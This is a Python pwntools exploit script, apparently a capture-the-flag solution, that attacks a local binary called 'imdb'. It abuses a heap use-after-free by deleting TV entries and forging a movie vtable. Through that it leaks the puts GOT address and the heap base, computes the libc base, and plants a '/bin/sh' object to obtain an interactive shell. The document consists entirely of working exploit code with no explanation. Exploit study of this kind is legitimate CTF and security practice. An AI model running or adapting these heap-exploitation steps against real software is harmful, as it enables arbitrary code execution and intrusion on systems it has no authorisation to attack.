#!/usr/bin/env python2
# encoding: utf-8
from pwn import *
context.update(arch='amd64', os='linux', bits=64, log_level='debug')
binary = './imdb'
e = ELF(binary)
e.checksec()

LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(LIBC)

#HeapPoint_601DC0
#TV: off_4015F0
#Movie: off_4015B0


io = process(binary)
gdb.attach(io, '''
		continue
	''')	

def add_TV(name, intro=''):
	global io
	io.recvuntil('Your choice?')
	io.sendline('1')
	io.recvuntil('name?')
	io.sendline(name)
	io.recvuntil('Season?')
	io.sendline('1')
	io.recvuntil('Rating?')
	io.sendline('1')
	io.recvuntil('introduction?')
	io.sendline(intro)
	io.recvuntil('added.')

def add_movie(name, actors=''):
	global io
	io.recvuntil('Your choice?')
	io.sendline('2')
	io.recvuntil('name?')
	io.sendline(name)
	io.recvuntil('Actors?')
	io.sendline(actors)
	io.recvuntil('Rating?')
	io.sendline('1')
	io.recvuntil('introduction?')
	io.sendline('1')
	io.recvuntil('added.')

def remove(name):
	global io
	io.recvuntil('Your choice?')
	io.sendline('3')
	io.recvuntil('remove?')
	io.sendline(name)

def show_actor(name):
	global io
	io.recvuntil('Your choice?')
	io.sendline('4')
	io.recvuntil(name + '>:')
	io.recvuntil('actors: ')
	data = io.readline().strip()
	return data

strtol_got = e.got['strtol']
puts_got = e.got['puts']
items = 0x601DC0
movie_vtable = 0x4015B0

LIBC_STRTOL = libc.symbols['strtol']
LIBC_PUTS = libc.symbols['puts']
LIBC_SYSTEM = libc.symbols['system']
#LIBC_BINSH = next(libc.search('/bin/sh\x00'))
#LIBC_MAGIC_SYSTEM = 0x3f306

add_TV('0')
add_TV('0')
add_TV('0')
remove('0')
test = pack(movie_vtable) + 'AAAA\x00'
test = test.ljust(0xb0, '\x00')
add_movie('1', test)

def leak(addr):
	name = '2' * 8 + pack(addr)
	add_movie(name)
	pause()
	data = show_actor('AAAA')
	remove(name)
	return data

puts = unpack(leak(puts_got).ljust(8, '\x00'))
print('Get puts = 0x%x' % puts)

heap_base = unpack(leak(items).ljust(8, '\x00'))
print('Get heap_base = 0x%x' % heap_base)

libc_base = puts - LIBC_PUTS
libc_system = libc_base + LIBC_SYSTEM
#magic_system = libc_base + LIBC_MAGIC_SYSTEM

print 'libc_base: ', hex(libc_base)
print 'libc_system: ', hex(libc_system)
#print 'magic_system: ', hex(magic_system)

add_TV('test')
add_TV('eeee')
add_TV('eeee')
add_TV('eeee')
add_TV('ZZZZ')
remove('eeee')
#base = pack(libc_system) + 'DDDD\x00'
base = "/bin/sh\x00" + 'DDDD\x00'
base = base.ljust(0xb0, '\x00')
add_movie('/bin/sh\x00', base)
name = '0'*0x8 + pack(heap_base + 0x2c8)
add_movie(name)
pause()
show_actor("DDDD")


io.interactive()






